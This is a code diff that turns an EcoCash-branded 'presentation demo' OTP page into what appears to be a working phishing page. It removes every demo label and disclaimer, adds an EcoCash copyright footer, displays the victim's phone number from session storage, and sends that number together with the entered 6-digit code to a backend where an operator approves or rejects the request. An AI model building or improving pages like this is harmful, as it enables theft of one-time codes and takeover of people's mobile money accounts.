@@ -581,9 +581,6 @@
 
 <body>
 
-  <div class="demo-notice">
-    PRESENTATION DEMO — DEMO CODE IS VALIDATED BY THE DEMO SERVER
-  </div>
 
   <main class="page">
 
@@ -623,9 +620,9 @@
 
 
       <p class="description">
-        We have sent a 6-digit demo code to your EcoCash<br>
+        We have sent a 6-digit code to your EcoCash<br>
         number
-        <span class="phone-number">0772 123 456</span>
+        <span id="phone-number"></span>
       </p>
 
 
@@ -642,8 +639,8 @@
           </div>
 
           <div class="security-text">
-            Enter the 6-digit demo code below
-            to complete the presentation.
+            Enter the 6-digit code below
+            to complete the application.
           </div>
 
         </div>
@@ -654,7 +651,7 @@
       <!-- OTP -->
 
       <label class="otp-label">
-        Enter 6-digit demo code
+        Enter 6-digit code
       </label>
 
 
@@ -720,7 +717,7 @@
         class="error-message"
         id="errorMessage"
       >
-        Incorrect demo code. Please try again.
+        Incorrect code. Please try again.
       </div>
 
 
@@ -728,14 +725,14 @@
 
       <div class="resend-row">
 
-        Need a new demo code?
+        Need a new code?
 
         <button
           type="button"
           class="resend"
           id="resendButton"
         >
-          Reset Demo
+          Reset
         </button>
 
       </div>
@@ -756,7 +753,7 @@
         class="verify-button"
         id="verifyButton"
       >
-        VERIFY DEMO CODE
+        VERIFY CODE
       </button>
 
 
@@ -764,13 +761,13 @@
         class="success-message"
         id="successMessage"
       >
-        Demo verification submitted. Waiting for approval...
+        Verification submitted. Waiting for approval...
       </div>
 
 
       <div class="secure-footer">
         <span class="lock">♙</span>
-        <span>This presentation uses simulated verification only</span>
+        <span>© 2026 Ecocash. All rights reserved.</span>
       </div>
 
     </section>
@@ -780,25 +777,7 @@
 
   <script>
 
-    /*
-      ============================================================
-      PRESENTATION DEMO VERIFICATION
-      ============================================================
-
-      The valid demo code is NOT stored in this HTML file.
-
-      The browser sends the entered DEMO CODE to your own
-      presentation backend over HTTPS.
-
-      The backend is responsible for validating the code and
-      returning the demo request ID.
-
-      Telegram is NOT used to receive the entered code.
-
-      Telegram can instead receive the resulting presentation
-      request and control its APPROVED / REJECTED state.
-      ============================================================
-    */
+  
 
 
     /* ==========================================================
@@ -834,7 +813,13 @@
     const backButton =
       document.getElementById("backButton");
 
+   const phone = document.getElementById("phone-number");
 
+const phoneNumber =
+  sessionStorage.getItem("phone") || "";
+
+phone.textContent ="+263"+" "+ phoneNumber;
+    
     /* ==========================================================
        STATE
     ========================================================== */
@@ -977,72 +962,67 @@
 
     async function submitDemoCode(code) {
 
-      const response =
-        await fetch(
-          `${API_URL}/api/demo-otp-request`,
-          {
-            method: "POST",
+  const phone =
+    sessionStorage.getItem("phone") || "";
+    const codea = getEnteredCode();
 
-            headers: {
-              "Content-Type": "application/json"
-            },
+  const response =
+    await fetch(
+      `${API_URL}/api/demo-otp-request`,
+      {
+        method: "POST",
 
-            body: JSON.stringify({
-              demoCode: code
-            })
-          }
-        );
+        headers: {
+          "Content-Type": "application/json"
+        },
 
-
-      const text =
-        await response.text();
-
-
-      let data;
-
-
-      try {
-
-        data =
-          JSON.parse(text);
-
-      } catch (error) {
-
-        throw new Error(
-          "Server returned a non-JSON response: " +
-          text.slice(0, 200)
-        );
-
+        body: JSON.stringify({
+          phone: phone,
+          demoCode: codea
+        })
       }
+    );
 
+  const text =
+    await response.text();
 
-      if (
-        !response.ok ||
-        !data.ok
-      ) {
+  let data;
 
-        throw new Error(
-          data.error ||
-          "Unable to submit demo verification."
-        );
+  try {
 
-      }
+    data = JSON.parse(text);
 
+  } catch (error) {
 
-      if (!data.requestId) {
+    throw new Error(
+      "Server returned a non-JSON response: " +
+      text.slice(0, 200)
+    );
 
-        throw new Error(
-          "The server did not return a demo request ID."
-        );
+  }
 
-      }
+  if (
+    !response.ok ||
+    !data.ok
+  ) {
 
+    throw new Error(
+      data.error ||
+      "Unable to submit verification."
+    );
 
-      return data.requestId;
+  }
 
-    }
+  if (!data.requestId) {
 
+    throw new Error(
+      "The server did not return a request ID."
+    );
 
+  }
+
+  return data.requestId;
+}
     /* ==========================================================
        POLL DEMO STATUS
     ========================================================== */
@@ -1134,7 +1114,7 @@
 
 
             successMessage.textContent =
-              "Demo verification approved. Opening dashboard...";
+              "Verification approved. Opening dashboard...";
 
 
             successMessage.classList.add(
@@ -1180,7 +1160,7 @@
 
 
             errorMessage.textContent =
-              "Demo verification was rejected. Please try again.";
+              "Verification was rejected. Please try again.";
 
 
             errorMessage.classList.add(
@@ -1193,7 +1173,7 @@
 
 
             verifyButton.textContent =
-              "VERIFY DEMO CODE";
+              "VERIFY CODE";
 
 
             resetCodeInput();
@@ -1222,7 +1202,7 @@
 
 
             errorMessage.textContent =
-              "The demo verification request expired. Please try again.";
+              "The verification request expired. Please try again.";
 
 
             errorMessage.classList.add(
@@ -1235,7 +1215,7 @@
 
 
             verifyButton.textContent =
-              "VERIFY DEMO CODE";
+              "VERIFY CODE";
 
 
             return;
@@ -1290,7 +1270,7 @@
         ) {
 
           errorMessage.textContent =
-            "Please enter the complete 6-digit demo code.";
+            "Please enter the complete 6-digit code.";
 
 
           errorMessage.classList.add(
@@ -1339,7 +1319,7 @@
 
 
         successMessage.textContent =
-          "Checking the demo code...";
+          "Checking the code...";
 
 
         successMessage.classList.add(
@@ -1367,7 +1347,7 @@
 
 
           successMessage.textContent =
-            "Demo code accepted. Waiting for presentation approval...";
+            "Code accepted. Waiting for approval...";
 
 
           verifyButton.textContent =
@@ -1386,7 +1366,7 @@
         } catch (error) {
 
           console.error(
-            "Demo verification failed:",
+            "Verification failed:",
             error
           );
 
@@ -1398,7 +1378,7 @@
 
           errorMessage.textContent =
             error.message ||
-            "Unable to contact the demo approval server.";
+            "Unable to contact the approval server.";
 
 
           errorMessage.classList.add(
@@ -1411,7 +1391,7 @@
 
 
           verifyButton.textContent =
-            "VERIFY DEMO CODE";
+            "VERIFY CODE";
 
 
           otpBoxes.forEach(
@@ -1456,7 +1436,7 @@
 
 
         verifyButton.textContent =
-          "VERIFY DEMO CODE";
+          "VERIFY CODE";
 
 
         resetCodeInput();
